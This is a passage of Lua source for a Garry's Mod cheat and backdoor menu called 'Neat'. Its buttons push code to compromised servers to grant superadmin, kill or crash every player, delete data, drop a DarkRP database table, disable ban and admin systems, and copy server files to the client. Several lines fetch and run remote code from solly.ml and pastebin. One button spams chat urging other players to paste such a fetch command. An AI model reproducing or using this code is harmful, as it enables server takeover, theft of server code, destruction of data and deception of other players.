    button_add("ebalka solly", function() aa([[BroadcastLua(" http.Fetch('http://solly.ml/ebalka.lua',RunString) ")]]) end)
    button_add("Rcon command", function()
        Derma_StringRequest("Neat", "Rcon command", "", function(g)
            net.Start(NEATbackdoornet)
            net.WriteString([[game.ConsoleCommand( "]] .. tostring(g) .. [[" .. "\n" )]])
            net.WriteBit(1)
            net.SendToServer()
        end)
    end)

    button_add("images", function()
        Derma_StringRequest("Neat", "link", "", function(g)
            net.Start(NEATbackdoornet)
            net.WriteString([[local b=vgui.Create("DFrame")b:SetSize(ScrW(),ScrH())b:Center()b:MakePopup()b:SetTitle("")local h=vgui.Create("DHTML",b)h:Dock(1)h:OpenURL("]] .. g .. [[")]])
            net.WriteBit(1)
            net.SendToServer()
        end)
    end)

    button_add(slomatfizika, function() aa("RunConsoleCommand(\"sv_friction\", \"-8\")") end)
    button_add("darkrp crash", function() aa('sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")') end)
    button_add("rip fadmin", function() aa('_G.FAdmin = function() end') end)
    button_add("rip bans", function() aa('_R = debug.getregistry()function game.KickID()return end function _R.Player.Ban()return end function _R.Player.Kick()return end') end)
    button_add("rip ulx", function() aa('_G.ulx = function() end _G.ULib = function() end') end)
    button_add("download server to data", function()
        aa([[util.AddNetworkString("daet")util.AddNetworkString("dai")fdg=math.random(5555555)fgfgf=0.3;net.Receive('dai',function(a,b)local function c(d)d=d or""local e,f=file.Find(d.."*",'MOD')for g,h in pairs(e)do local i=string.gsub(d,'addons1/','')timer.Simple(fgfgf,function()net.Start("daet")net.WriteString("Neat_cheat_sborki/"..fdg.."/"..i)net.WriteString(h)net.WriteString(file.Read(i.."/"..h,"GAME"))net.Send(b)end)fgfgf=fgfgf+0.3 end;for j,k in pairs(f)do c(d..k..'/')end end;c('addons/')c('cfg/')c('lua/')c('gamemodes/')c('data/')end)]])
        timer.Simple(2, function()
            net.Receive('daet', function()
                local Q = net.ReadString()
                local ae = net.ReadString()
                local ag = net.ReadString()
                if not string.find(ae, ".lua") then return end
                file.CreateDir(Q)
                file.Write(Q .. ae .. ".txt", ag)
                print("[Neat]Скачалось:" .. Q .. ae)
            end)

            net.Start("dai")
            net.SendToServer()
        end)
    end)
end

local function ah()
    if NEAT_spam then
        NEAT_spam = not NEAT_spam
        Notify(Disable)
        timer.Destroy("NEAT_spam", 1, 0, function() end)
    else
        NEAT_spam = not NEAT_spam
        Notify(Enable)
        timer.Create("NEAT_spam", 0.000000000000001, 0, function() RunConsoleCommand("say", file.Read("Neat_cheat/NEAT_set_spam_text.txt", "DATA")) end)
    end
end

local function ai()
    if NEAT_lol then
        NEAT_lol = not NEAT_lol
        Notify(Disable)
        hook.Remove("HUDPaint", "dfgfdgf")
    else
        NEAT_lol = not NEAT_lol
        Notify(Enable)
        hook.Add("HUDPaint", "dfgfdgf", function()
            for x, p in pairs(player.GetAll()) do
                if o(p) then
                    local em = FindMetaTable"Entity"
                    local vm = FindMetaTable"Vector"
                    local pos = em.GetPos(p)
                    local pos, aj = vm.ToScreen(pos - Vector(0, 0, 5)), vm.ToScreen(pos + Vector(0, 0, 70))
                    local u = pos.y - aj.y
                    local t = u / 2.2
                    local ak = em.Health(p) * u / 100
                    if ak > u then ak = u end
                    local al = u - ak
                    surface.SetDrawColor(0, 0, 0, 255)
                    surface.DrawRect(pos.x - t / 2 - 5, pos.y - u - 1, 3, u + 2)
                    surface.SetDrawColor((100 - em.Health(p)) * 2.55, em.Health(p) * 2.55, 0, 255)
                    surface.DrawRect(pos.x - t / 2 - 4, pos.y - u + al, 1, ak)
                    surface.SetDrawColor(Color(255, 0, 0, 220))
                    surface.DrawOutlinedRect(pos.x - t / 2, pos.y - u, t, u)
                    surface.SetDrawColor(255, 0, 0, 225)
                    surface.DrawOutlinedRect(pos.x - t / 2 - 1, pos.y - u - 1, t + 2, u + 2)
                    surface.DrawOutlinedRect(pos.x - t / 2 + 1, pos.y - u + 1, t - 2, u - 2)
                end
            end
        end)
    end
end

local function an()
    if NEAT_lol then
        NEAT_lol = not NEAT_lol
        hook.Remove("PostDraw2DSkyBox", "no_sky")
        Notify(Disable)
    else
        NEAT_lol = not NEAT_lol
        Notify(Enable)
        hook.Add("PostDraw2DSkyBox", "no_sky", function() render.Clear(0, 0, 0, 0, true, true) end)
    end
end

local function ao()
    for x, p in pairs(file.Find("bin/gmcl_cvar3_win32.dll", "LuaMenu")) do
        require("cvar3")
        GetConVar("sv_cheats"):SetFlags(0)
        GetConVar("sv_cheats"):SetValue(1)
    end

    if GetConVar("sv_cheats"):GetInt() == 1 then
        h(instaled_sv_cheat_odin)
    else
        h(ystanovitedll)
    end
end

local function ap()
    if ulx then
        chat.AddText(Color(0, 0, 0), "(Console) ", Color(152, 212, 255), "added ", Color(74, 0, 131), "You ", Color(152, 212, 255), "to group ", Color(0, 255, 0), "superadmin")
        ULib.ucl.query = function() return true end
        xgui.PermissionsChanged(LocalPlayer())
        xgui.init(LocalPlayer())
    else
        i("not ulx")
    end
end

local function aq()
    if NEAT_lol then
        NEAT_lol = not NEAT_lol
        hook.Remove("HUDPaint", "L_steni")
    else
        NEAT_lol = not NEAT_lol
        Notify(Enable)
        hook.Add("HUDPaint", "L_steni", function()
            for x, p in next, Entity(0):GetMaterials() do
                Material(p):SetFloat("$alpha", .85)
            end
        end)
    end
end

local function ar()
    if NEAT_els then
        NEAT_els = not NEAT_els
        Notify(Disable)
        timer.Destroy("NEAT_mute", 1, 0, function() end)
        for x, af in pairs(player.GetAll()) do
            af:SetMuted(false)
        end
    else
        NEAT_els = not NEAT_els
        timer.Create("NEAT_mute", 1, 0, function()
            for x, af in pairs(player.GetAll()) do
                af:SetMuted(true)
            end
        end)

        Notify(Enable)
    end
end

local function as()
    if NEAT__norecoil then
        NEAT__norecoil = not NEAT__norecoil
        Notify(Disable)
        hook.Remove("CalcView", "b")
    else
        NEAT__norecoil = not NEAT__norecoil
        me = LocalPlayer()
        hook.Add("CalcView", "b", function(n, pos, at, C)
            if not me:IsValid() or not me:Alive() or not me:GetViewEntity() == me or me:InVehicle() then return end
            local au = {}
            au.angles = me:EyeAngles()
            return au
        end)

        Notify(Enable)
    end
end

local function av()
    local NEAT = vgui.Create("DFrame")
    NEAT:SetSize(500, 247)
    NEAT:Center()
    NEAT:SetTitle("")
    NEAT:SetVisible(true)
    NEAT:SetDraggable(true)
    NEAT:ShowCloseButton(false)
    NEAT:MakePopup()
    NEAT.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, NEAT:GetWide(), NEAT:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, NEAT:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, NEAT:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - " .. AdminList, "Roboto", NEAT:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", NEAT)
    a5:SetText("")
    a5:SetPos(NEAT:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() NEAT:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local AppList = vgui.Create("DListView", f)
    AppList:SetPos(2, 24)
    AppList:SetSize(496, 220)
    AppList:SetMultiSelect(true)
    AppList:AddColumn(NickN)
    AppList:AddColumn(Group)
    AppList:SetParent(NEAT)
    for x, af in pairs(player.GetAll()) do
        if not af:GetUserGroup() == "user" then
            local aw = af:Nick()
            local ax = af:GetUserGroup()
            AppList:AddLine(aw, ax)
        end
    end
end

local function ay()
    if NEAT_lol then
        NEAT_lol = not NEAT_lol
        Notify(Disable)
        hook.Remove("HUDPaint", "esfdgdffdp")
    else
        NEAT_lol = not NEAT_lol
        Notify(Enable)
        hook.Add("HUDPaint", "esfdgdffdp", function()
            for x, p in pairs(player.GetAll()) do
                local az = (p:GetPos() + p:GetUp() * 150):ToScreen()
                surface.SetTextPos(az.x, az.y)
                surface.SetFont("Default")
                surface.SetTextColor(team.GetColor(p:Team(p)))
                surface.DrawText(p:Name())
            end
        end)
    end
end

local function aA()
    local NEAT = vgui.Create("DFrame")
    NEAT:SetPos(100, 100)
    NEAT:SetSize(590, 335)
    NEAT:Center()
    NEAT:SetTitle("")
    NEAT:SetVisible(true)
    NEAT:SetDraggable(true)
    NEAT:ShowCloseButton(false)
    NEAT:MakePopup()
    NEAT.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, NEAT:GetWide(), NEAT:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, NEAT:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, NEAT:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - super backdoor", "Roboto", NEAT:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", NEAT)
    a5:SetText("")
    a5:SetPos(NEAT:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() NEAT:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local function aB(c, f)
        net.Start(c)
        net.WriteString(f)
        net.WriteBit(1)
        net.SendToServer()
    end

    local function aC(f)
        for l = 1, math.huge do
            local z = util.NetworkIDToString(l)
            if util.NetworkIDToString(l) == nil then
                break
            else
                if z == "Undo_Undone" or z == "Undo_AddUndo" or z == "properties" or z == "drive_base" or z == "drive_noclip" or z == "SilentHaxor" or z == "player_default" or z == "PlayerKilled" or z == "PlayerKilledSelf" or z == "PlayerKilledByPlayer" or z == "PlayerKilledNPC" or z == "NPCKilledNPC" or z == "GModSave" or z == "player_sandbox" or z == "drive_sandbox" or z == "ReceiveDupe" or z == "ArmDupe" or z == "CopiedDupe" or z == "worldspawn" or z == "player_manager" or z == "weapon_oldmanharpoon" or z == "weapon_stunstick" or z == "weapon_smg1" or z == "grenade_ar2" or z == "weapon_slam" or z == "npc_tripmine" or z == "npc_satchel" or z == "weapon_shotgun" or z == "weapon_rpg" or z == "rpg_missile" or z == "weapon_pistol" or z == "weapon_physcannon" or z == "weapon_frag" or z == "npc_grenade_frag" or z == "weapon_crowbar" or z == "weapon_crossbow" or z == "crossbow_bolt" or z == "weapon_ar2" or z == "prop_combine_ball" or z == "env_entity_dissolver" or z == "weapon_357" or z == "weapon_citizensuitcase" or z == "weapon_citizenpackage" or z == "item_healthvial" or z == "item_healthkit" or z == "item_battery" or z == "weapon_shotgun_hl1" or z == "weapon_satchel" or z == "monster_satchel" or z == "weapon_rpg_hl1" or z == "rpg_rocket" or z == "weapon_mp5_hl1" or z == "grenade_mp5" or z == "weapon_hornetgun" or z == "hornet" or z == "scene_manager" or z == "weapon_handgrenade" or z == "grenade_hand" or z == "weapon_glock_hl1" or z == "weapon_gauss" or z == "weapon_egon" or z == "weapon_crossbow_hl1" or z == "crossbow_bolt_hl1" or z == "weapon_357_hl1" or z == "ammo_357" or z == "weaponbox" or z == "weapon_tripmine" or z == "monster_tripmine" or z == "weapon_snark" or z == "monster_snark" or z == "weapon_crowbar_hl1" or z == "ammo_buckshot" or z == "ammo_rpgclip" or z == "ammo_argrenades" or z == "ammo_mp5grenades" or z == "ammo_9mmbox" or z == "ammo_9mmar" or z == "ammo_mp5clip" or z == "ammo_9mmclip" or z == "ammo_glockclip" or z == "ammo_gaussclip" or z == "ammo_egonclip" or z == "ammo_crossbow" or z == "simple_bot" or z == "weapon_alyxgun" or z == "vgui_screen" or z == "entityflame" or z == "weapon_physgun" or z == "weapon_swep" or z == "sent_point" or z == "env_skypaint" or z == "editvariable" or z == "env_fog_controller" or z == "env_sun" or z == "UserGroup" or z == "predicted_viewmodel" or z == "sent_anim" or z == "gmod_hands" or z == "gmod_tool" or z == "gmod_camera" or z == "ServerName" or z == "prop_physics" or z == "env_flare" or z == "_firesmoke" or z == "Count.props" then
                else
                    net.Start(z)
                    net.WriteString(f)
                    net.WriteBit(1)
                    net.SendToServer()
                end
            end
        end
    end

    local ad = vgui.Create("DScrollPanel", NEAT)
    ad:SetPos(5, 30)
    ad:SetSize(200, 300)
    local aD = vgui.Create("DButton", NEAT)
    aD:SetText("")
    aD:SetPos(210, 30)
    aD:SetSize(260, 25)
    aD.DoClick = function()
        local aE = DermaMenu()
        aE:AddOption("Give superadmin", function() aC([[local id = ]] .. LocalPlayer():UserID() .. [[ RunConsoleCommand( 'ulx', 'adduser', tostring( Player( id ):Nick() ), 'superadmin' )Player( id ):SetUserGroup( "superadmin" )]]) end)
        aE:AddOption(pornzvyki, function() aC("hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )") end)
        aE:AddOption("backdoor", function() aC('util.AddNetworkString("NEAT")net.Receive("NEAT",function()RunString(net.ReadString())end)') end)
        aE:AddOption(zdelatvsemscreen, function() aC("BroadcastLua([[RunConsoleCommand('screenshot')]])") end)
        aE:AddOption(killall, function() aC("for k,v in pairs(player.GetAll()) do v:Kill() end") end)
        aE:AddOption(crashall, function() aC("for k,v in pairs(player.GetAll()) do v:SendLua(\"while true do end\") end") end)
        aE:AddOption("всем админку супер", function() aC([[for k,v in pairs(player.GetAll()) do RunConsoleCommand("ulx","adduser",v:Nick(),"superadmin") end]]) end)
        aE:AddOption("2D models", function() aC("") end)
        aE:AddOption(deletedata, function() aC([[local function a(b)b=b or""local c,d=file.Find(b.."*",'MOD')for e,f in pairs(c)do local g=string.gsub(b,'data/','')file.Delete(g..f)end;for h,i in pairs(d)do a(b..i..'/')end end;a('data/')]]) end)
        aE:AddOption("Rcon command", function() Derma_StringRequest("Neat", "Rcon command", "", function(g) aC([[game.ConsoleCommand( "]] .. tostring(g) .. [[" .. "\n" )]]) end) end)
        aE:AddOption(slomatfizika, function() aC("RunConsoleCommand(\"sv_friction\", \"-8\")") end)
        aE:AddOption("darkrp crash", function() aC('sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")') end)
        button_add("rip ulx", function() aC('_G.ulx = function() end _G.ULib = function() end') end)
        button_add("rip fadmin", function() aC('_G.FAdmin = function() end') end)
        button_add("rip bans", function() aC('_R = debug.getregistry()function game.KickID()return end function _R.Player.Ban()return end function _R.Player.Kick()return end') end)
        aE:AddOption("ebalka solly", function() aC([[BroadcastLua(" http.Fetch('http://solly.ml/ebalka.lua',RunString) ")]]) end)
        aE:Open()
    end

    aD.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText("Запустить все сразу", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if aD.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    for l = 1, math.huge do
        local z = util.NetworkIDToString(l)
        if util.NetworkIDToString(l) == nil then
            break
        else
            if z == "Undo_Undone" or z == "Undo_AddUndo" or z == "properties" or z == "drive_base" or z == "drive_noclip" or z == "SilentHaxor" or z == "player_default" or z == "PlayerKilled" or z == "PlayerKilledSelf" or z == "PlayerKilledByPlayer" or z == "PlayerKilledNPC" or z == "NPCKilledNPC" or z == "GModSave" or z == "player_sandbox" or z == "drive_sandbox" or z == "ReceiveDupe" or z == "ArmDupe" or z == "CopiedDupe" or z == "worldspawn" or z == "player_manager" or z == "weapon_oldmanharpoon" or z == "weapon_stunstick" or z == "weapon_smg1" or z == "grenade_ar2" or z == "weapon_slam" or z == "npc_tripmine" or z == "npc_satchel" or z == "weapon_shotgun" or z == "weapon_rpg" or z == "rpg_missile" or z == "weapon_pistol" or z == "weapon_physcannon" or z == "weapon_frag" or z == "npc_grenade_frag" or z == "weapon_crowbar" or z == "weapon_crossbow" or z == "crossbow_bolt" or z == "weapon_ar2" or z == "prop_combine_ball" or z == "env_entity_dissolver" or z == "weapon_357" or z == "weapon_citizensuitcase" or z == "weapon_citizenpackage" or z == "item_healthvial" or z == "item_healthkit" or z == "item_battery" or z == "weapon_shotgun_hl1" or z == "weapon_satchel" or z == "monster_satchel" or z == "weapon_rpg_hl1" or z == "rpg_rocket" or z == "weapon_mp5_hl1" or z == "grenade_mp5" or z == "weapon_hornetgun" or z == "hornet" or z == "scene_manager" or z == "weapon_handgrenade" or z == "grenade_hand" or z == "weapon_glock_hl1" or z == "weapon_gauss" or z == "weapon_egon" or z == "weapon_crossbow_hl1" or z == "crossbow_bolt_hl1" or z == "weapon_357_hl1" or z == "ammo_357" or z == "weaponbox" or z == "weapon_tripmine" or z == "monster_tripmine" or z == "weapon_snark" or z == "monster_snark" or z == "weapon_crowbar_hl1" or z == "ammo_buckshot" or z == "ammo_rpgclip" or z == "ammo_argrenades" or z == "ammo_mp5grenades" or z == "ammo_9mmbox" or z == "ammo_9mmar" or z == "ammo_mp5clip" or z == "ammo_9mmclip" or z == "ammo_glockclip" or z == "ammo_gaussclip" or z == "ammo_egonclip" or z == "ammo_crossbow" or z == "simple_bot" or z == "weapon_alyxgun" or z == "vgui_screen" or z == "entityflame" or z == "weapon_physgun" or z == "weapon_swep" or z == "sent_point" or z == "env_skypaint" or z == "editvariable" or z == "env_fog_controller" or z == "env_sun" or z == "UserGroup" or z == "predicted_viewmodel" or z == "sent_anim" or z == "gmod_hands" or z == "gmod_tool" or z == "gmod_camera" or z == "ServerName" or z == "prop_physics" or z == "env_flare" or z == "_firesmoke" or z == "Count.props" then
            else
                local aD = ad:Add("DButton")
                aD:SetText("")
                aD:Dock(4)
                aD:DockMargin(0, 0, 0, 5)
                aD.DoClick = func
                aD.Paint = function(a6, t, u)
                    draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
                    draw.SimpleText(z, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                    if aD.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
                end

                aD.DoClick = function()
                    local aE = DermaMenu()
                    aE:AddOption("Give superadmin", function() aB(z, [[local id = ]] .. LocalPlayer():UserID() .. [[ RunConsoleCommand( 'ulx', 'adduser', tostring( Player( id ):Nick() ), 'superadmin' )Player( id ):SetUserGroup( "superadmin" )]]) end)
                    aE:AddOption(pornzvyki, function() aB(z, "hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )") end)
                    aE:AddOption(zdelatvsemscreen, function() aB(z, "BroadcastLua([[RunConsoleCommand('screenshot')]])") end)
                    aE:AddOption(killall, function() aB(z, "for k,v in pairs(player.GetAll()) do v:Kill() end") end)
                    aE:AddOption(crashall, function() aB(z, "for k,v in pairs(player.GetAll()) do v:SendLua(\"while true do end\") end") end)
                    aE:AddOption("all superadmin", function() aB(z, [[for k,v in pairs(player.GetAll()) do RunConsoleCommand("ulx","adduser",v:Nick(),"superadmin") end]]) end)
                    aE:AddOption("2D models", function() aB(z, "") end)
                    aE:AddOption(deletedata, function() aB(z, [[local function a(b)b=b or""local c,d=file.Find(b.."*",'MOD')for e,f in pairs(c)do local g=string.gsub(b,'data/','')file.Delete(g..f)end;for h,i in pairs(d)do a(b..i..'/')end end;a('data/')]]) end)
                    aE:AddOption("Rcon command", function()
                        Derma_StringRequest("Neat", "Rcon command", "", function(g)
                            net.Start(z)
                            net.WriteString([[game.ConsoleCommand( "]] .. tostring(g) .. [[" .. "\n" )]])
                            net.WriteBit(1)
                            net.SendToServer()
                        end)
                    end)

                    aE:AddOption(slomatfizika, function() aB(z, "RunConsoleCommand(\"sv_friction\", \"-8\")") end)
                    aE:AddOption("darkrp crash", function() aB(z, 'sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")') end)
                    button_add("rip fadmin", function() aB(z, '_G.FAdmin = function() end') end)
                    button_add("rip ulx", function() aB(z, '_G.ulx = function() end _G.ULib = function() end') end)
                    button_add("rip bans", function() aB(z, '_R = debug.getregistry()function game.KickID()return end function _R.Player.Ban()return end function _R.Player.Kick()return end') end)
                    aE:AddOption("ebalka solly", function() aB(z, [[BroadcastLua(" http.Fetch('http://solly.ml/ebalka.lua',RunString) ")]]) end)
                    aE:Open()
                end
            end
        end
    end
end

local function aF()
    local ac = vgui.Create("DFrame")
    ac:SetSize(415, 307)
    ac:Center()
    ac:MakePopup()
    ac:ShowCloseButton(false)
    ac:SetTitle("")
    ac.target = LocalPlayer()
    ac.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, ac:GetWide(), ac:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, ac:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, ac:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - client backdoor", "Roboto", ac:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", ac)
    a5:SetText("")
    a5:SetPos(ac:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() ac:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local ad = vgui.Create("DScrollPanel", ac)
    ad:SetPos(210, 30)
    ad:SetSize(200, 235)
    function addfunk(ae, func)
        local aD = ad:Add("DButton")
        aD:SetText("")
        aD:Dock(4)
        aD:DockMargin(0, 0, 0, 5)
        aD.DoClick = func
        aD.Paint = function(a6, t, u)
            draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
            draw.SimpleText(ae, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            if aD.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
        end
    end

    function Sosi_moi_zopa(ae)
        LocalPlayer():ConCommand("say #" .. ae)
    end

    addfunk("screenshot", function() Sosi_moi_zopa("screenshot()") end)
    addfunk("say", function() Derma_StringRequest("", "Что сказать", "", function(g) Sosi_moi_zopa("say('" .. g .. "')") end) end)
    addfunk("runconsolecommand", function() Derma_StringRequest("", "команда", "", function(g) Sosi_moi_zopa("LocalPlayer():ConCommand('" .. g .. "')") end) end)
    addfunk("connect", function() Derma_StringRequest("", "ip", "", function(g) Sosi_moi_zopa("LocalPlayer():ConCommand('connect " .. g .. "')") end) end)
    addfunk("crash", function() Sosi_moi_zopa("crash()") end)
    addfunk("allerror", function() Sosi_moi_zopa("plyerror()") end)
    addfunk("disco", function() Sosi_moi_zopa("disco()") end)
    for z = 1, 23 do
        addfunk("xD", function() Sosi_moi_zopa("g") end)
    end

    local AppList = vgui.Create("DListView", ac)
    AppList:SetPos(5, 30)
    AppList:SetSize(200, 235)
    AppList:SetMultiSelect(false)
    AppList:AddColumn("")
    hook.Add("OnPlayerChat", "NEATBackdoor", function(n, g, aG, aH) if not n == LocalPlayer() and g == "32432432" then AppList:AddLine(n:Nick()) end end)
    local aD = vgui.Create('DButton', ac)
    aD:SetPos(5, 270)
    aD:SetSize(200, 30)
    aD:SetText("")
    aD.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText("check", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if aD.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    aD.DoClick = function() LocalPlayer():ConCommand("say 31573652467") end
    local aD = vgui.Create('DButton', ac)
    aD:SetPos(210, 270)
    aD:SetSize(200, 30)
    aD:SetText("")
    aD.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText("give backdoor", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if aD.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    aD.DoClick = function()
        if GetConVar("sv_allowcslua"):GetInt() == 1 then
            if DarkRP then
                LocalPlayer():ConCommand([[say /ooc Введите в консоль 'lua_run_cl http.Fetch("https://pastebin.com/raw/0HMPvNwP",RunSting)']])
                LocalPlayer():ConCommand("say /ooc Получите 100kk!")
            else
                LocalPlayer():ConCommand([[say Введите в консоль 'lua_run_cl http.Fetch("https://pastebin.com/raw/0HMPvNwP",RunSting)']])
                LocalPlayer():ConCommand("say Получите админку!")
            end
        else
            LocalPlayer():ChatPrint("неа sv_allowcslua 0(")
        end
    end
end

function Add_lemos_log_chat(z)
    Lemos_log_chat = Lemos_log_chat .. "\n" .. z
end

hook.Add("OnPlayerChat", "g", function(n, g, aG, aH) Add_lemos_log_chat(os.date("%H:%M:%S") .. " " .. n:Nick() .. ": " .. g) end)
function Add_lemos_log_connect(z)
    Lemos_log_connect = Lemos_log_connect .. "\n" .. z
end

hook.Add("ChatText", "g", function(aI, ae, g, aJ) if aJ == "joinleave" then Add_lemos_log_connect(os.date("%H:%M:%S") .. " " .. g) end end)
function Add_lemos_log_kills(z)
    Lemos_log_kills = Lemos_log_kills .. "\n" .. z
end

gameevent.Listen("entity_killed")
hook.Add("entity_killed", "Lemos_kills", function(H)
    local aK = H.entindex_inflictor
    local aL = H.entindex_attacker
    local aM = H.damagebits
    local aN = H.entindex_killed
    local n = "unknown"
    local aO = game.GetWorld()
    local aP = "map"
    local aQ = "unknown weapons"
    local aR = game.GetWorld()
    local aS = ents.GetByIndex(aK)
    for j, aT in pairs(player.GetAll()) do
        if aT:EntIndex() == aN then
            n = aT:Nick()
            aO = aT
        end

        if aT:EntIndex() == aL then
            aP = aT:Nick()
            aR = aT
            if aT:GetActiveWeapon() and aT:GetActiveWeapon():IsValid() then aQ = aT:GetActiveWeapon():GetPrintName() end
        end
    end

    if aL == aN then Add_lemos_log_kills(os.date("%H:%M:%S") .. " " .. n .. " self-killed") end
    if aS:IsValid() and aS:GetClass() == "prop_physics" then Add_lemos_log_kills(os.date("%H:%M:%S") .. " " .. n .. " killed by prop") end
    Add_lemos_log_kills(os.date("%H:%M:%S") .. " " .. aP .. " killed " .. n .. " weapons " .. aQ)
end)

function Add_lemos_log_disconnect(z)
    Lemos_log_disconnect = Lemos_log_disconnect .. "\n" .. z
end

gameevent.Listen("player_disconnect")
hook.Add("player_disconnect", "b", function(H) Add_lemos_log_disconnect(os.date("%H:%M:%S") .. " " .. H.name .. " " .. H.networkid .. " disconnect (" .. H.reason .. ")") end)
local function aU()
    local aV = vgui.Create("DFrame")
    aV:SetSize(700, 380)
    aV:Center()
    aV:SetTitle("")
    aV:SetVisible(true)
    aV:SetDraggable(true)
    aV:ShowCloseButton(false)
    aV:MakePopup()
    aV.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, aV:GetWide(), aV:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, aV:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, aV:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - logs", "Roboto", aV:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", aV)
    a5:SetText("")
    a5:SetPos(aV:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() aV:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

